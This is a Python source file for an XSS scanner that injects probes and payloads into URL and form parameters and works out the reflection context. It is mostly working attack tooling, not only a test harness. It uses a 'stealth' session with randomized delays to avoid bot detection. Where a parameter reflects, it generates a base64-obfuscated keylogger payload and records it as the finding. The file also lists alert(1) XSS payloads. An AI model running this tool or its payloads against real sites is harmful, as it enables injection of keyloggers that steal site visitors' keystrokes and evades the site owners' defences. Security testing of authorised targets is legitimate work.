"""
scanner.py - XSS Vulnerability Scanner

Scans URLs for potential XSS injection points and tests with various payloads.
"""

import re
import requests
import logging
from typing import Dict, List, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from .factory import PayloadFactory
from .stealth import StealthSession, StealthConfig, human_delay

logger = logging.getLogger(__name__)


class Scanner:
    """
    XSS vulnerability scanner similar to dalfox/XSStrike.
    
    Features human-like request patterns to avoid bot detection.
    """
    
    # Test payloads for reflection detection
    REFLECTION_PROBES = [
        '<test>',
        '"test"',
        "'test'",
        '<script>test</script>',
        'javascript:test',
    ]
    
    # Simple XSS payloads for verification
    VERIFY_PAYLOADS = {
        'html': '<img src=x onerror=alert(1)>',
        'attribute': '" onmouseover="alert(1)" x="',
        'script': '-alert(1)-',
        'style': 'expression(alert(1))',
        'url': 'javascript:alert(1)',
    }
    
    def __init__(self, timeout: int = 10, user_agent: Optional[str] = None, stealth: bool = True):
        self.timeout = timeout
        self.factory = PayloadFactory()
        
        # Use stealth session for human-like behavior
        if stealth:
            config = StealthConfig(
                min_delay_ms=800,
                max_delay_ms=2500,
            )
            self.session = StealthSession(config)
            self.session.session.headers['User-Agent'] = user_agent or self.session.session.headers.get('User-Agent')
            logger.info("Scanner initialized with stealth mode enabled")
        else:
            self.session = requests.Session()
            self.session.headers.update({'User-Agent': user_agent or "Mozilla/5.0 (exxploit/1.0)"})

    
    def _parse_url(self, url: str) -> Dict:
        """Parse URL into components."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return {
            'scheme': parsed.scheme,
            'netloc': parsed.netloc,
            'path': parsed.path,
            'params': {k: v[0] for k, v in params.items()},
            'fragment': parsed.fragment,
        }
    
    def _build_url(self, parsed: Dict, params: Dict) -> str:
        """Rebuild URL with modified parameters."""
        query = urlencode(params)
        return urlunparse((
            parsed['scheme'],
            parsed['netloc'],
            parsed['path'],
            '',
            query,
            parsed['fragment']
        ))
    
    def _decode_response(self, response: str) -> str:
        """Decode common encodings in response to detect obfuscated reflections."""
        import html
        from urllib.parse import unquote
        
        # Apply multiple decoding passes
        decoded = response
        decoded = html.unescape(decoded)  # HTML entities (&lt; -> <)
        decoded = unquote(decoded)  # URL encoding (%3C -> <)
        
        return decoded
    
    def _detect_reflection(self, response: str, probe: str) -> Optional[str]:
        """Detect if and where probe is reflected in response."""
        # Check both raw and decoded response for robustness
        responses_to_check = [response, self._decode_response(response)]
        
        for resp in responses_to_check:
            if probe in resp:
                # Determine context
                patterns = {
                    'script': rf'<script[^>]*>[^<]*{re.escape(probe)}[^<]*</script>',
                    'attribute': rf'<[^>]+\s+\w+=["\'][^"\']*{re.escape(probe)}[^"\']*["\']',
                    'style': rf'style=["\'][^"\']*{re.escape(probe)}',
                    'html': rf'>[^<]*{re.escape(probe)}[^<]*<',
                }
                
                for context, pattern in patterns.items():
                    if re.search(pattern, resp, re.IGNORECASE | re.DOTALL):
                        return context
                
                return 'html'  # Default context
        return None

    
    def scan(
        self, 
        url: str, 
        param: Optional[str] = None,
        method: str = 'GET',
        crawl: bool = False,
    ) -> List[Dict]:
        """
        Scan URL for XSS vulnerabilities.
        
        Args:
            url: Target URL (use INJECT marker for injection point)
            param: Specific parameter to test (optional)
            method: HTTP method
            crawl: Whether to crawl for more endpoints
        
        Returns:
            List of vulnerability findings
        """
        results = []
        parsed = self._parse_url(url)
        
        # Determine parameters to test
        if 'INJECT' in url:
            # Replace INJECT marker with probes
            for probe in self.REFLECTION_PROBES:
                test_url = url.replace('INJECT', probe)
                try:
                    resp = self.session.get(test_url, timeout=self.timeout)
                    resp.raise_for_status()
                    context = self._detect_reflection(resp.text, probe)
                    if context:
                        results.append({
                            'url': url,
                            'param': 'INJECT',
                            'context': context,
                            'payload': self.VERIFY_PAYLOADS.get(context, ''),
                            'status': 'vulnerable',
                        })
                        break
                except requests.exceptions.RequestException as e:
                    logger.debug(f"Scan request failed for {test_url}: {e}")
                except Exception as e:
                    logger.error(f"Unexpected error scanning {test_url}: {e}")
        else:
            # Test each parameter
            params_to_test = [param] if param else list(parsed['params'].keys())
            
            for p in params_to_test:
                if p not in parsed['params']:
                    continue
                
                original_value = parsed['params'][p]
                
                for probe in self.REFLECTION_PROBES:
                    test_params = parsed['params'].copy()
                    test_params[p] = probe
                    test_url = self._build_url(parsed, test_params)
                    
                    try:
                        if method.upper() == 'POST':
                            resp = self.session.post(
                                self._build_url(parsed, {}),
                                data=test_params,
                                timeout=self.timeout
                            )
                        else:
                            resp = self.session.get(test_url, timeout=self.timeout)
                        
                        resp.raise_for_status()
                        context = self._detect_reflection(resp.text, probe)
                        if context:
                            # Generate actual payload
                            payload = self.factory.select_payload(
                                'keylogger', 
                                context=context, 
                                obfuscation='base64'
                            )
                            
                            results.append({
                                'url': url,
                                'param': p,
                                'context': context,
                                'payload': payload,
                                'status': 'vulnerable',
                            })
                            break
                    except requests.exceptions.RequestException as e:
                        logger.debug(f"Parameter scan failed for {p} on {url}: {e}")
                    except Exception as e:
                        logger.error(f"Unexpected error scanning parameter {p}: {e}")
        
        return results
    
    def quick_test(self, url: str, payload: str) -> bool:
        """
        Quick test to see if payload executes.
        
        Args:
            url: URL with INJECT marker
            payload: Payload to test
        
        Returns:
            True if payload appears reflected in response
        """
        try:
            test_url = url.replace('INJECT', payload)
            resp = self.session.get(test_url, timeout=self.timeout)
            # Basic check - see if payload is in response
            return payload[:20] in resp.text
        except Exception:
            return False
